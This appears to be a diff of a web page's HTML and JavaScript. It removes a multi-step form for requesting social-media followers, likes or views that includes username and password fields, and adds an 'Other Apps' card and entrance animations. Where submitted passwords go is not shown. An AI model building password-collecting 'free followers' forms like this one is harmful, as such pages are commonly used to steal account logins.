-            goToSuccessPage();
-        } else {
-            if (!navigator.onLine) {
-                document.getElementById('offlineOverlay').style.display = 'flex';
-                pendingSubmit = true;
-            } else {
-                showToast('Failed to send. Check internet connection.', 'error', 5000);
-            }
-        }
-
-        btn.disabled = false;
-        btn.textContent = 'SUBMIT REQUEST';
-    }
-
-    function goToSuccessPage() {
-        document.getElementById('sliderTrack').style.transform = 'translateX(-200vw)';
-        document.getElementById('appWindow').style.paddingTop = '80px';
-        
-        const animContainer = document.getElementById('fullscreenAnimContainer');
-        const confettiIframe = document.getElementById('confettiIframe');
-        
-        if(successAnimStopTimer) clearTimeout(successAnimStopTimer);
-        
-        confettiIframe.src = "https://lottie.host/embed/55502969-5545-4838-ae5a-1d873f3f1c95/U0eLScKS7a.lottie";
-        animContainer.style.display = 'flex';
-        
-        successAnimStopTimer = setTimeout(() => {
-            animContainer.style.display = 'none';
-            confettiIframe.src = ""; 
-        }, 3500);
-
-        let timeLeft = 10;
-        const timerEl = document.getElementById('countdownTimer');
-        timerEl.textContent = timeLeft;
-
-        if(timerInterval) clearInterval(timerInterval);
-        
-        timerInterval = setInterval(() => {
-            timeLeft--;
-            timerEl.textContent = timeLeft;
-            if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                resetForm();
-                jumpDirectlyToHome(); 
-            }
-        }, 1000);
-    }
-
-    function resetForm() {
-        ['origUser','fakeUser','fakePass','dynamicInput'].forEach(function(id) {
-            const el = document.getElementById(id);
-            if(el) {
-                el.value = '';
-                el.classList.remove('input-error');
-            }
-            if (id === 'fakePass') {
-                el.type = 'password';
-                document.getElementById('eye-open-fakePass').style.display = 'none';
-                document.getElementById('eye-closed-fakePass').style.display = 'block';
-            }
-            toggleIcons(id);
-        });
-        ['followers','likes','views'].forEach(function(s) {
-            document.getElementById('opt-' + s).classList.remove('active');
-        });
-        document.getElementById('dynamicArea').style.display = 'none';
-        document.getElementById('limitError').style.display = 'none';
-        if(limitErrorTimer) clearTimeout(limitErrorTimer);
-        selectedService = null;
-
-        if(successAnimStopTimer) clearTimeout(successAnimStopTimer);
-        document.getElementById('fullscreenAnimContainer').style.display = 'none';
-        document.getElementById('confettiIframe').src = "";
-    }
-
-    function goToForm() {
-        document.getElementById('sliderTrack').style.transition = 'transform 0.5s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.4s ease';
-        document.getElementById('sliderTrack').style.transform = 'translateX(-100vw)';
-        document.getElementById('page2').scrollTop = 0;
-        
-        document.getElementById('appWindow').style.paddingTop = '85px'; 
-        
-        const devBox = document.getElementById('devBox');
-        devBox.style.opacity = '0';
-        setTimeout(function() { devBox.style.display = 'none'; }, 300);
-    }
-
-    function goBackToHomeFromForm() {
-        document.getElementById('sliderTrack').style.transform = 'translateX(0)';
-        document.getElementById('appWindow').style.paddingTop = '140px';
-        const devBox = document.getElementById('devBox');
-        devBox.style.display = 'flex';
-        setTimeout(function() { devBox.style.opacity = '1'; }, 10);
-    }
-
-    function jumpDirectlyToHome() {
-        const track = document.getElementById('sliderTrack');
-        track.style.transition = 'opacity 0.4s ease';
-        track.style.opacity = '0'; 
-        
-        setTimeout(() => {
-            track.style.transition = 'none'; 
-            track.style.transform = 'translateX(0)'; 
+        <!-- Other Apps സെക്ഷൻ -->
+        <div class="others-section" id="othersSection">
+            <div class="others-title">Other Apps</div>
+            <div class="others-desc">Free, open-source, ad-free music app for Android that offers streaming and offline listening.</div>
             
-            document.getElementById('appWindow').style.paddingTop = '140px';
-            const devBox = document.getElementById('devBox');
-            devBox.style.display = 'flex';
-            devBox.style.opacity = '1';
+            <!-- ലിക്വിഡ് ഗ്ലാസ് ആപ്പ് കാർഡ് -->
+            <div class="app-card">
+                <div class="app-left-side">
+                    <!-- SVG മ്യൂസിക് ഐക്കൺ -->
+                    <div class="perfect-music-icon">
+                        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <path d="M9 18V5l12-2v13"></path>
+                            <circle cx="6" cy="18" r="3"></circle>
+                            <circle cx="18" cy="16" r="3"></circle>
+                        </svg>
+                    </div>
+                    <div class="app-name">Music App</div>
+                </div>
+                <!-- ഡൗൺലോഡ് ബട്ടൺ -->
+                <a href="https://gokadzev.github.io/Musify/" target="_blank" rel="noopener noreferrer" class="download-btn">Download</a>
+            </div>
+        </div>
+    </section>
+
+    <!-- ആനിമേഷൻ സ്ക്രിപ്റ്റ് -->
+    <script>
+        document.addEventListener("DOMContentLoaded", () => {
+            const elements = [
+                document.getElementById("mainTitle"),
+                document.getElementById("subTitle"),
+                document.getElementById("startBtn"),
+                document.getElementById("statusBox"),
+                document.getElementById("othersSection")
+            ];
+            
+            elements.forEach(el => {
+                el.style.opacity = 0;
+                el.style.transform = "translateY(20px)";
+            });
             
             setTimeout(() => {
-                track.style.transition = 'opacity 0.4s ease'; 
-                track.style.opacity = '1'; 
-                
-                setTimeout(() => {
-                    track.style.transition = 'transform 0.6s cubic-bezier(0.4, 0, 0.2, 1), opacity 0.4s ease';
-                }, 400);
-            }, 50);
-        }, 400);
-    }
-
-    function clearInput(id) {
-        const el = document.getElementById(id);
-        el.value = '';
-        el.focus();
-        el.classList.remove('input-error');
-        toggleIcons(id);
-    }
-
-    function selectService(serviceType) {
-        selectedService = serviceType;
-        ['followers','likes','views'].forEach(function(s) {
-            document.getElementById('opt-' + s).classList.remove('active');
+                elements.forEach((el, index) => {
+                    el.style.transition = `opacity 0.8s ease-out ${index * 0.2}s, transform 0.8s ease-out ${index * 0.2}s`;
+                    el.style.opacity = 1;
+                    el.style.transform = "translateY(0)";
+                });
+            }, 100);
         });
-        document.getElementById('opt-' + serviceType).classList.add('active');
-
-        const area  = document.getElementById('dynamicArea');
-        const input = document.getElementById('dynamicInput');
-        const errorMsg = document.getElementById('limitError'); 
-        
-        area.style.display = 'block';
-        input.value = '';
-        input.classList.remove('input-error');
-        errorMsg.style.display = 'none'; 
-        if(limitErrorTimer) clearTimeout(limitErrorTimer); 
-        
-        toggleIcons('dynamicInput');
-
-        if (serviceType === 'followers') {
-            input.type        = 'number';
-            input.placeholder = 'Enter count (Optional)';
-        } else {
-            input.type        = 'url';
-            input.placeholder = 'Paste link here (https://...)';
-        }
-    }
-</script>
+    </script>
 
 </body>
 </html>
